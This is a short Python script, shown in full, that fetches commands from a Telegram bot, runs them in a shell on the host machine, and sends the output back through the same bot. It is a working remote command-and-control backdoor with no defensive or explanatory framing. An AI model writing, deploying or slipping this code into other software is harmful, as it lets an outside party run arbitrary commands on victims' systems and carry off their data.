import requests, subprocess
updates = requests.get("https://api.telegram.org/botTOKEN/getUpdates").json()
cmd = updates["result"][0]["message"]["text"]
out = subprocess.check_output(cmd, shell=True)
requests.post("https://api.telegram.org/botTOKEN/sendMessage", data={"chat_id": 1, "text": out})
